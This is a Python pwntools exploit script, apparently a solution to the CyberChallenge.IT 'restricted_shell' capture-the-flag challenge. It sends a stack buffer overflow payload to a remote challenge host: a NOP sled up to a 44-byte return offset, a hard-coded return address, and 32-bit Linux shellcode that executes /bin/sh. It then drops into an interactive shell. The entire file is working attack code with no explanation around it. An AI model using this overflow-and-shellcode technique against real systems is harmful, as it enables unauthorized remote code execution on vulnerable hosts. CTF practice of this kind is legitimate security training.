from pwn import *

BIN: str = "./restricted_shell"
HOST: str = "shell.challs.cyberchallenge.it"
PORT: int = 9123

RET_OFFSET: int = 44
TARGET_ADDR: bytes = p32(0x08048593).ljust(4, b'\x00')
SHELLCODE: bytes = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

def get_target(is_remote: bool):
  if is_remote:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  p = get_target(True)
  payload = asm('nop')*RET_OFFSET + TARGET_ADDR + SHELLCODE
  payload += TARGET_ADDR
  p.sendline(payload)
  print(p.clean())
  p.interactive()

if __name__ == "__main__":
  main()